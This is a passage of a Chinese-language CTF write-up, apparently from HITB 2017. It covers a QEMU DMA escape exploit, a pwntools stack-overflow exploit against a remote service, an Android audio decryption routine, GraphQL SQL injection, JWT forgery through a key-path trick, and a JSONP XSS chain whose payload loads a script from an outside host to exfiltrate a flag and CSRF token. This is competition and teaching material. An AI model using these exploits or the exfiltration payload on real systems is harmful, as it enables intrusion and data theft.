    devmmio = mem; 
/* 
    uint8_t* dma_mem = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVAT
E |MAP_ANONYMOUS, -1, 0); 
    if(dma_mem == (void*)-1) { fatal("mmap"); } 
    */ 
    *(char*)(dma_mem) = 0x41;   // touch 
    uintptr_t phys_addr = vtop((uintptr_t)dma_mem); 
    if(phys_addr == 0) { fatal("vtop"); } 
    //printf("dma_mem %#p phys_addr %#p\n", dma_mem, phys_addr); 
    //printf("leak...\n"); 
    dma_set_src_low(0x41000); 
    dma_set_src_hi(0); 
    dma_set_dst_low(phys_addr & 0xFFFFFFFF); 
    dma_set_dst_hi(phys_addr >> 32); 
    dma_set_cnt(0x100); 
    dma_set_cmd(DMA_WRITE); 
    sleep(1); 
    qworddump(dma_mem, 0x200); 
    uint64_t leak = *(uint64_t*)(dma_mem) - 0x283dd0; 
    //printf("leaked base = %#p\n", leak); 
    uint64_t system = leak + 0x1FDB18; 
    *(uint64_t*)(dma_mem) = system; 
    //printf("oob...\n"); 
    dma_set_src_low(phys_addr & 0xFFFFFFFF); 
    dma_set_src_hi(phys_addr >> 32); 
    dma_set_dst_low(0x41000); 
    dma_set_dst_hi(0); 
    dma_set_cnt(0x8); 
    dma_set_cmd(DMA_READ); 
    sleep(1); 
    //strcpy(dma_mem, "/bin/sh;"); 
    strcpy(dma_mem, "/bin/sh"); 
    dma_set_src_low(phys_addr & 0xffffffff); 
    dma_set_src_hi(phys_addr >> 32); 
    dma_set_dst_low(0x40000); 
    dma_set_dst_hi(0); 
    dma_set_cnt(0x100); 
    dma_set_cmd(DMA_READ); 
    sleep(1); 
    //printf("trigger...\n"); 
    dma_set_src_hi(0); 
    dma_set_src_low(0x40000); 
    dma_set_dst_hi(0); 
    dma_set_dst_low(0); 
    dma_set_cnt(8); 
    dma_set_cmd(DMA_WRITE | DMA_ENCRYPT); 
    sleep(1); 
    return 0; 
} 
1000levels
hint虽然不会打印出system的地址，但是可以把system的地址留在栈上。
后面输入关卡数量的时候第一次输入一个负数可以保留system的地址，第二次输入system和
one_gadget的地址差可以把one_gadget的地址留在栈上。
随后闯完1000关之后直接把返回地址覆盖为vsyscall的地址，使之可以一直ret到one_gadget的地
址。
其实不用闯完1000关，栈可以溢出的空间很大，可以直接覆盖满，就不用跑那么久了。
from pwn import * 
# p = process('./1000levels', env={'LD_PRELOAD':'./libc.so.6'}) 
p = remote('47.74.147.103', 20001) 
libc_base = -0x45390 
one_gadget_base = 0x4526a 
def launch_gdb(): 
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c'] 
    gdb.attach(proc.pidof(p)[0]) 
def ansewer(): 
    p.recvuntil('Question: ') 
    tmp1 = eval(p.recvuntil(' ')[:-1]) 
    p.recvuntil('* ') 
    tmp2 = eval(p.recvuntil(' ')[:-1]) 
    p.sendline(str(tmp1 * tmp2)) 
p.recvuntil('Choice:') 
p.sendline('2') 
p.recvuntil('Choice:') 
p.sendline('1') 
p.recvuntil('How many levels?') 
p.sendline('-1') 
p.recvuntil('Any more?') 
p.sendline(str(libc_base+one_gadget_base)) 
for i in range(999): 
    log.info(i) 
    ansewer() 
# launch_gdb() 
p.recvuntil('Question: ') 
p.send('a'*0x38 + p64(0xffffffffff600000) * 3)   
# ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                 
 [vsyscall] 
p.interactive() 
Mobile
prime
经过分析发现只有质数和质数的平方会增加计数。
于是找到一个神奇的网站
最后计数的结果就应该是10^16以内的质数个数加上10^8以内的质数个数。
SecretRecorder
这个app在录完音后会调用一个native的函数。在这个函数中把音频转换成了图片。
替换头的部分比较简单，主要的加密算法为：
对应的解密算法为：
#include  
#include  
#define FILE_SIZE 2380854 
char s[2380854+1]; 
char s2[2380854+1]={0}; 
int main() 
{ 
    FILE* f = fopen("key.bmp","rb"); 
    fread(s,2380854,1,f); 
    fclose(f); 
    int v9 = 1; 
    int v10 = 99; 
    int i=0; 
    int j = 54; 
    int k=FILE_SIZE-1; 
    while(i-54) 
    { 
        if(v9==1) 
        { 
            s2[i] = s[j]^v10; 
            j++; 
            v10^=0x42; 
            v9=0; 
        } 
        if(v9==0) 
        { 
            s2[i] = s[k]^v10; 
            k--; 
            v10^=0x42; 
            v9=1; 
        } 
        i++; 
    } 
    f = fopen("de_key.bmp","wb"); 
    fwrite(s2,2380854 -54,1,f); 
    fclose(f); 
    return 0; 
} 
解密之后手动添加一下wav文件头，就可以听到录音：
谁 踢 艾特 赛文 是大二 爱死 屁 一扣 噢 乃 图 欸可斯
经过翻译可以得到at@7*sp=o92x
用这个密码解开压缩包之后可以得到一个音频，猜测是需要再加密一遍：
#include  
#include  
#define FILE_SIZE 768626  
char s[FILE_SIZE+1]; 
char s2[FILE_SIZE+1]={0}; 
char padd[100]={0}; 
int main() 
{ 
    FILE* f = fopen("flag.wav","rb"); 
    fread(s,FILE_SIZE,1,f); 
    fclose(f); 
    int v9 = 1; 
    int v10 = 99; 
    int i=44; 
    int j = 44; 
    int k=FILE_SIZE-1; 
    while(i-44) 
    { 
        if(v9==1) 
        { 
            s2[j] = s[i]^v10; 
            j++; 
            v10^=0x42; 
            v9=0; 
        } 
        else if(v9==0) 
        { 
            s2[k] = s[i]^v10; 
            k--; 
            v10^=0x42; 
            v9=1; 
        } 
        i++; 
    } 
    f = fopen("de_flag.bmp","wb"); 
    fwrite(padd,54,1,f); 
    fwrite(s2+44,FILE_SIZE -44,1,f); 
    fclose(f); 
    return 0; 
} 
加密过后改个文件头就可以看到ﬂag了。
字写得真丑
Web
blog
在首页点点/查看html会发现所有与后端交互都是通过 api 这个接口进行的，请求的格式为  
query:{ itemsForAuthor(id:"aYT0x") { id title } }
看样子是对数据库的操作  
随便抓了一个，看起来像base64，在后面随便添加一段很长的东西测试一下
发现sql语句报错
传入空值也有报错  
根据报错可以找到这个应用所用的框架，就是 facebook 用的 graphql 。  
http://facebook.github.io/graphql/   
这个框架将数据库的操作转换成类似 nosql 的操作，安全性比较高。  
查看官方文档，发现几个内置的操作：
__schema查看一下系统所有的根对象
__type可以对某个对象的属性进行查看
发现根对象中的Query中有个属性叫itemSelection
现在的问题是Query对象在哪里被调用
在测试前期，我们随便输入内容
会发现有报错
"errors":[{"message":"Cannot query field \"zz\" on type  
\"Query\".","locations":[{"column":4,"line":1}]}]} 
发现这里第一个被调用的就是 Query 对象  
于是我们可以直接这么传：  
query={ itemSelection }   
即可调用query对象，发现报错：
这里面有两个信息：
首先有个筛选字段是必须的，叫 ids ，需要提供查询字段， itemselection 的属性是
BlogItem ，这个属性  
的可查询字段可以通过 __type 查看
于是可以构造一个查询的query如下  
query={ itemSelection(ids:"xxx"){ id title content} }   
在ids传入随便一个文章id bYj0x
可以查到，测试下在后面直接拼接单引号(base64)：
ok，存在注入
因为是 类json 数据， sqlmap 总是很奇怪的在各种大括号旁边加 *   
影响注入，于是写个 tamper
Pasty
是一个在线粘贴板的东西，可以选择分享或独自查看，选择分享，就会多出一个下载的接口。
随便注册个账号，登录，发现是通过 Bearer 验证方式验证的
base64decode 一下
发现一个目录 keys/ 里面存有五个公钥
同时有个 JWT ，搜索一下，搜到一个可以在线签名的,把验证信息贴上去，就会被自动解码划分出各
部分  
https://jwt.io/
看了下验证机制，其实就是通过rsa对前面的信息进行签名，然后验证签名，但是我们没有他那个路
径下对应  
公钥的私钥，无法伪造签名。
这里要利用一下这个网站本身的业务，当我们选择分享剪贴板的时候，就会提供下载接口，发现下
载其实就是  
在查看剪贴板后面拼接了 ?raw 参数
于是我们可以贴一个自己生成的公钥，然后在前面指定目录为下载这里，就会利用我们贴的这个公
钥做验证。  
我们发现其实读取的时候后面是拼接 .pem 的，而这个 ?raw 参数刚好可以利用 ?raw= 来闭合
掉 .pem   
利用与公钥对应的私钥签名，来伪造自己是 admin ，同时指定公钥的路径
利用得到的验证串，可以查看admin的剪贴板，即可get ﬂag
eyJraWQiOiJhcGkvcGFzdGUvYjZjZTAxZGEtMDRhMi00ZjRmLTk4NmEtZjUzZTNkYTBkMGM1P3J
hdz0 
iLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.ZXOTvgMrmwSxtyO
UJ2rY 
Bh2ba5mOE4DGhT7wpzbPGT9NYPxYx9ajuftNEhZxJ1S9QE63pwIIto5zQ5KMXvokCLnVS7mDPs
X0pvO 
capUC_XrmMl5YEeHTzhtXXreYiHc83Q-juIPX910Tfyu7d2c1EjillUn4RkaqrGZZe7j94Hw 
ﬂag HITB{b128a14885c4974c4a7016eb1d79aae6}
Website
一个xss，感觉应该有好多种做法，好多地方都有xss orz（waf一点都不严格）。  
首先先随便注册个账号登录
site填入我的vps地址，发现他会访问。
于是入口点就是：构造一个富含xss的链接发给他。
xss的地方很多，最好利用的是
这个getInfo接口，返回jsonp数据，存在反射型xss,而且没上waf。
jsonp的referer检查就可以利用302跳转解决。  
于是我们的攻击链扩充到了：  
链接->302 jsonp xss   
问题是如何拿到ﬂag？  
经过测试发现ﬂag是通过getﬂag接口
获取  
需要的参数是 csrftoken
http://47.88.218.105:20010/getflag.php?
csrftoken=c1a10e97f9c2fa973299fa3154f38b58
能否有权限获取ﬂag是读取 jsonp 中的 username ，这个 username 是后端解密 cookie 中的
username 得到的明文
cookie 中的 username 受 http-only 保护不可读取，也没有能显示出 cookie 中加密的
username 的页面，于是只能控制admin去访问ﬂag页面然后返回给我们了。
整个利用如下：
链接-> 
302到jsonp xss-> 
提取jsonp中csrftoken字段-> 
xhr 控制读取flag-> 
返回flag到xss平台 
发送链接的php内容
b.js内容
Data:  
{'flag':'HITB{j50nP_1s_VulN3r4bLe}','csrftoken':'058807fed91d1b8807688bd25
8710c 
be'} 
IP: 47.88.218.105 
Date and Time: 25 August, 2017, 12:31 pm 
Referer: http://47.88.218.105:20010/action.php? 
callback=%3Cscript+src=%22http://123.206.216.198/b.js%22%3E%3C%2Fscript%3E 
getﬂag